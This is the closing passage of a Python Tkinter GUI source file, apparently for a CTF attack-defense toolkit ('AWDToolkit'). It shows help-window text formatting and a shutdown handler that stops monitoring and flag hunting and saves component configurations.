                text.insert(tk.END, line + '\n', 'text')
            elif line.strip().startswith(('①','②','③','④','⑤','⑥','⑦')):
                text.insert(tk.END, line + '\n', 'h2')
            elif line.strip().startswith('─'):
                text.insert(tk.END, line + '\n', 'sep')
            elif line.strip() == '': pass
            else: text.insert(tk.END, line + '\n', 'text')
        text.config(state=tk.DISABLED)
        tb.Button(win, text='关闭', command=win.destroy).pack(pady=(0,8))

    def on_close(self):
        try: self.mon.monitoring = False; self.mon.save_config()
        except Exception: pass
        try: self.flag.stop_hunt(); self.flag.save_known(); self.flag.save_config()
        except Exception: pass
        try: self.waf.save_config()
        except Exception: pass
        try: self.creep.save_cfg()
        except Exception: pass
        self.root.destroy()


if __name__ == '__main__':
    AWDToolkit()
